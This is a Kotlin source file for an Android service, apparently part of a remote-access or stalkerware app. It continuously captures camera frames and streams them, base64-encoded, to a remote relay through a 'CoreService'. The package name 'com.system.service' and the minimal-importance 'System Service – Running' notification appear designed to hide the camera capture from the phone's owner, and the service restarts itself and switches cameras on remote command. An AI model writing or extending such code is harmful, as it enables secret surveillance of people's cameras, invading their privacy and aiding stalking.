package com.system.service.monitors

import android.app.*
import android.content.Intent
import android.content.pm.ServiceInfo
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.*
import android.util.Base64
import com.system.service.core.CoreService
import org.json.JSONObject
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicLong

class CameraStreamService : Service() {

    companion object {
        var isRunning    = false
        var currentFace  = "back"    // "front" or "back" — readable by CoreService for switch_camera
        var currentInterval = 33L    // readable by CoreService for switch_camera
        private const val CHANNEL_ID = "cam_stream"
        private const val NOTIF_ID   = 11
    }

    private val streaming  = AtomicBoolean(false)
    private val lastSentAt = AtomicLong(0L)
    private var cameraDevice: CameraDevice? = null
    private var session: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private var thread: HandlerThread? = null
    private var handler: Handler? = null
    private var intervalMs: Long = 33L

    // Single executor lives for the Service lifetime — never shut down mid-session.
    // BUG FIX: Previously encodeExecutor.shutdown() was called in stopStream() which is called
    // BEFORE startCamera() on a restart → RejectedExecutionException on encodeExecutor.execute().
    private val encodeExecutor = Executors.newSingleThreadExecutor()

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == "STOP") {
            cleanupCamera()
            isRunning = false
            stopSelf()
            return START_NOT_STICKY
        }
        // BUG FIX: If called twice (e.g. switch_camera or double start), clean up old
        // camera resources first. Without this, two sessions run simultaneously → crash.
        cleanupCamera()

        createChannel()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIF_ID, buildNotif(), ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
        } else {
            startForeground(NOTIF_ID, buildNotif())
        }

        currentFace = intent?.getStringExtra("face") ?: "back"
        currentInterval = (intent?.getLongExtra("interval", 33L) ?: 33L).coerceAtLeast(16L)
        intervalMs = currentInterval

        isRunning = true
        streaming.set(true)
        startCamera(useFront = (currentFace == "front"))
        return START_STICKY
    }

    /** Clean up camera resources WITHOUT touching encodeExecutor — safe to call before restart. */
    private fun cleanupCamera() {
        streaming.set(false)
        try { session?.stopRepeating() }  catch (_: Exception) {}
        try { session?.close() }          catch (_: Exception) {}
        try { cameraDevice?.close() }     catch (_: Exception) {}
        try { imageReader?.close() }      catch (_: Exception) {}
        try { thread?.quitSafely() }      catch (_: Exception) {}
        session = null; cameraDevice = null; imageReader = null; thread = null; handler = null
    }

    private fun startCamera(useFront: Boolean) {
        thread = HandlerThread("CamStream", Process.THREAD_PRIORITY_URGENT_DISPLAY).apply { start() }
        handler = Handler(thread!!.looper)

        val mgr = getSystemService(CAMERA_SERVICE) as CameraManager

        val wantedFacing = if (useFront)
            CameraCharacteristics.LENS_FACING_FRONT
        else
            CameraCharacteristics.LENS_FACING_BACK

        val camId = mgr.cameraIdList.firstOrNull { id ->
            mgr.getCameraCharacteristics(id)
                .get(CameraCharacteristics.LENS_FACING) == wantedFacing
        } ?: mgr.cameraIdList.firstOrNull() ?: return

        val map = mgr.getCameraCharacteristics(camId)
            .get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) ?: return
        val sizes = map.getOutputSizes(ImageFormat.JPEG)

        // 480p sweet spot — low lag, readable quality, bandwidth manageable at 30fps
        val sorted = sizes.sortedBy { it.width * it.height }
        val size = sorted.firstOrNull { it.width >= 480 } ?: sorted.last()

        // 5 buffers — prevents blocking when WebSocket relay is momentarily slow
        imageReader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 5)
        imageReader!!.setOnImageAvailableListener({ reader ->
            val img = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
            try {
                val now = System.currentTimeMillis()
                if (now - lastSentAt.get() < intervalMs) { img.close(); return@setOnImageAvailableListener }
                lastSentAt.set(now)

                val buf   = img.planes[0].buffer
                val bytes = ByteArray(buf.remaining()).also { buf.get(it) }
                img.close()

                val w = size.width; val h = size.height
                encodeExecutor.execute {
                    try {
                        CoreService.instance?.sendData("camera_frame", JSONObject().apply {
                            put("frame", Base64.encodeToString(bytes, Base64.NO_WRAP))
                            put("w", w); put("h", h)
                            put("face", if (useFront) "front" else "back")
                        })
                    } catch (_: Exception) {}
                }
            } catch (_: Exception) { try { img.close() } catch (_: Exception) {} }
        }, handler)

        try {
            mgr.openCamera(camId, object : CameraDevice.StateCallback() {
                override fun onOpened(cam: CameraDevice) {
                    cameraDevice = cam
                    val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
                        addTarget(imageReader!!.surface)
                        set(CaptureRequest.CONTROL_CAPTURE_INTENT, CaptureRequest.CONTROL_CAPTURE_INTENT_VIDEO_RECORD)
                        set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                        // AF_MODE_OFF with focus=0 (hyperfocal) = zero AF hunting lag
                        set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_OFF)
                        set(CaptureRequest.LENS_FOCUS_DISTANCE, 0.0f)
                        set(CaptureRequest.LENS_OPTICAL_STABILIZATION_MODE,
                            CaptureRequest.LENS_OPTICAL_STABILIZATION_MODE_OFF)
                    }.build()
                    cam.createCaptureSession(listOf(imageReader!!.surface),
                        object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(s: CameraCaptureSession) {
                                if (!streaming.get()) { s.close(); return }
                                session = s
                                try { s.setRepeatingRequest(req, null, handler) } catch (_: Exception) {}
                            }
                            override fun onConfigureFailed(s: CameraCaptureSession) { stopSelf() }
                        }, handler)
                }
                override fun onDisconnected(cam: CameraDevice) { cam.close(); cameraDevice = null }
                override fun onError(cam: CameraDevice, e: Int) { cam.close(); cameraDevice = null; stopSelf() }
            }, handler)
        } catch (_: SecurityException) { stopSelf() }
    }

    private fun createChannel() {
        val ch = NotificationChannel(CHANNEL_ID, "Camera", NotificationManager.IMPORTANCE_MIN)
            .apply { setShowBadge(false); enableLights(false); enableVibration(false) }
        getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
    }

    private fun buildNotif() = Notification.Builder(this, CHANNEL_ID)
        .setContentTitle("System Service").setContentText("Running")
        .setSmallIcon(android.R.drawable.ic_menu_info_details).build()

    override fun onDestroy() {
        cleanupCamera()
        isRunning = false
        encodeExecutor.shutdown()
        super.onDestroy()
    }
    override fun onBind(intent: Intent?): IBinder? = null
}
